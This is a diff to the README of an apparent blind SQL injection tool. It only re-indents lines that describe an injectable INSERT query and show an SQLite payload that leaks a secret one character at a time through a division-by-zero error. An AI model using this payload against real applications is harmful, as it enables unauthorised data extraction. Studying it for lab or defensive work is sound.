@@ -4,9 +4,9 @@ A small Python tool to exploit blind SQL injection in a feedback-style form that
 # How it works
 
  - The target app builds something like:
-  - INSERT INTO feedback(username, feedback) VALUES(?, '<USER_INPUT>')
+     INSERT INTO feedback(username, feedback) VALUES(?, '<USER_INPUT>')
  - We submit payloads that succeed only when our character guess is correct, and fail otherwise, e.g. (SQLite example):
- - '||(SELECT CASE
+    '||(SELECT CASE
            WHEN substr(secret,POS,1)='C' THEN ''
            ELSE (SELECT 1/0) END
          FROM secret_table)||'
